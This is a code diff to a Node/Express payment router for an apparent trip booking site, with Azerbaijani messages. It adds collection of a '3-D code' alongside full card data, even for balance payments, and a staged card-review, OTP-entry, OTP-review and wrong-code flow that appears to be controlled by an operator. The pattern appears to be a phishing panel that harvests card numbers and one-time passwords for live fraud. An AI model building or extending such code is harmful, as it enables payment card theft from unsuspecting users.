@@ -22,6 +22,13 @@ function validateCardInput(card) {
   return null;
 }
 
+/* Kart forması ilə birlikdə daxil edilən 1-ci 3-D kod */
+function validateCode(code) {
+  const digits = String(code || '').replace(/\D/g, '');
+  if (digits.length < 4 || digits.length > 8) return '3-D kod 4-8 rəqəm olmalıdır';
+  return null;
+}
+
 /* ==================== Rezervasiya səhifəsi ==================== */
 router.get('/rezervasyon/:tripId', requireAuth, async (req, res, next) => {
   try {
@@ -148,10 +155,10 @@ router.post('/api/payment/card/init', requireAuth, async (req, res) => {
       return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb və ya təsdiqə göndərilib' });
     }
 
-    const err = validateCardInput(b.card);
+    const err = validateCardInput(b.card) || validateCode(b.code);
     if (err) return res.status(400).json({ ok: false, message: err });
 
-    const payment = await paymentService.initPayment(order, b.card, 'card');
+    const payment = await paymentService.initPayment(order, b.card, 'card', b.code);
 
     return res.json({
       ok: true,
@@ -174,14 +181,14 @@ router.post('/api/payment/balance/init', requireAuth, async (req, res) => {
     }
 
     /* Balans ilə alışda da kart məlumatları tələb olunur */
-    const err = validateCardInput(b.card);
+    const err = validateCardInput(b.card) || validateCode(b.code);
     if (err) return res.status(400).json({ ok: false, message: err });
 
     if ((req.currentUser.balance || 0) < order.total) {
       return res.status(400).json({ ok: false, message: 'Balans kifayət etmir' });
     }
 
-    const payment = await paymentService.initPayment(order, b.card, 'balance');
+    const payment = await paymentService.initPayment(order, b.card, 'balance', b.code);
 
     return res.json({
       ok: true,
@@ -216,6 +223,9 @@ router.get('/odenis-gozleme/:orderId', requireAuth, async (req, res, next) => {
       title: 'Ödənişin təsdiqi',
       order,
       payment,
+      stage: payment ? payment.stage : 'card_review',
+      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
+      stageSeconds: paymentService.STAGE_SECONDS,
       cardMasked: payment && payment.card ? payment.card.masked : '',
       declined: order.status === 'rejected'
     });
@@ -229,17 +239,24 @@ router.get('/api/payment/:orderId/status', requireAuth, async (req, res) => {
   try {
     const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
     if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
+    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
+    const stage = payment ? payment.stage : 'card_review';
+
+    /* Yönləndirmə yalnız ekran dəyişdikdə verilir:
+       otp_entry  -> 3-D OTP ekranı, confirmed -> uğur, rejected -> gözləmə (rədd mətni) */
+    let redirect = null;
+    if (order.status === 'confirmed') redirect = '/' + res.locals.locale + '/ugur/' + order._id;
+    else if (stage === 'otp_entry') redirect = '/' + res.locals.locale + '/3d-tesdiq/' + order._id;
+    else if (order.status === 'rejected') redirect = '/' + res.locals.locale + '/odenis-gozleme/' + order._id;
+
     res.json({
       ok: true,
       status: order.status,
-      redirect:
-        order.status === 'awaiting_verification' || order.status === 'code_submitted'
-          ? '/' + res.locals.locale + '/3d-tesdiq/' + order._id
-          : order.status === 'confirmed'
-            ? '/' + res.locals.locale + '/ugur/' + order._id
-            : order.status === 'rejected'
-              ? '/' + res.locals.locale + '/odenis-gozleme/' + order._id
-              : null,
+      stage,
+      wrongCode: stage === 'wrong_code',
+      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
+      stageSeconds: paymentService.STAGE_SECONDS,
+      redirect,
       message: order.adminNote || ''
     });
   } catch (e) {
@@ -261,13 +278,17 @@ router.get('/3d-tesdiq/:orderId', requireAuth, async (req, res, next) => {
     }
 
     const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
+    const stage = payment ? payment.stage : 'otp_entry';
 
     res.render('pages/secure3d', {
       title: res.locals.t('secure3d.title'),
       order,
       payment,
       cardMasked: payment && payment.card ? payment.card.masked : '',
-      codeSubmitted: order.status === 'code_submitted'
+      stage,
+      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
+      stageSeconds: paymentService.STAGE_SECONDS,
+      codeSubmitted: stage === 'otp_review' || order.status === 'code_submitted'
     });
   } catch (e) {
     next(e);
